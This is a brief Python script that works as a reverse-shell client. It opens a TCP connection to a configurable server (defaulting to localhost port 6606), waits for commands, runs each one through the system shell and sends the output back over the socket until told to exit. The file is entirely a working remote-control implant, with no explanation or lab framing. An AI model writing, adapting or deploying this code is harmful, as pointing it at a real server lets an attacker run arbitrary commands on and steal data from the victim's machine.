import socket
import subprocess
import os

def start_client(server_ip='127.0.0.1', server_port=6606):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, server_port))

    while True:
        command = client.recv(1024).decode()
        if command.lower() in ['exit', 'quit']:
            break

        print(f"Command => {command}")
        try:
            output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
        except subprocess.CalledProcessError as e:
            output = e.output

        output_decoded = output.decode('utf-8', errors='replace')
        print(f"Output:\n{output_decoded}")

        client.sendall(output)

    client.close()

if __name__ == "__main__":
    start_client()
